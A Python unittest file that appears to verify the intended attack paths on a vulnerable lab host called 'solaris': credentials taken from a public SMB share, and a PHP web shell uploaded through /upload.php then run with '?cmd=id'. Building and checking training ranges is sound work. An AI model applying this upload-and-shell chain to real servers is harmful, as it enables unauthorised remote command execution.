import unittest
from libraries.smb_share_tests import test_smb_share_exists, test_smb_file_access
from libraries.http_tests import check_http_payload_200
from custom.solaris import solaris_smb_initial_access


class TestSolaris(unittest.TestCase):
    solaris_target_ip = "10.100.7.40"

    # solaris test initial access via SMB
    def test_0_solaris_public_share_access(self): # check if share is accessible
        result = test_smb_share_exists(target_ip=self.solaris_target_ip, share_name="public")
        self.assertTrue(result.success, msg=result.message)

    def test_0_solaris_smb_file_access(self): # check if file is accessible
        result = test_smb_file_access(target_ip=self.solaris_target_ip, share_name="public", file="backup.zip", path="/")
        self.assertTrue(result.success, msg=result.message)

    def test_0_solaris_initial_access_via_smb(self): # check if file has solaris user password
        result = solaris_smb_initial_access(self.solaris_target_ip)
        self.assertTrue(result.success, msg=result.message)

    # solaris test initial access via HTTP (arbitrary file upload)
    def test_1_solaris_arbitrary_upload(self): # testing upload component
        result = check_http_payload_200(
            target_ip=self.solaris_target_ip, 
            url_path="/upload.php", 
            form_data={"submit": "Upload"}, 
            verb="POST", 
            files={"fileToUpload": "custom/assets/shell.php"}
        )
        self.assertTrue(result.success, msg=result.message)

    def test_2_solaris_rce_via_arbitrary_upload(self): # testing RCE component
        result = check_http_payload_200(
            target_ip=self.solaris_target_ip, 
            url_path="/uploads/shell.php?cmd=id",
        )

        self.assertTrue(result.success, msg=f"Shell not accessible: {result.message}")
        self.assertIn("uid=", result.data or "", msg="RCE failed - no command output")



if __name__ == "__main__":
    unittest.main()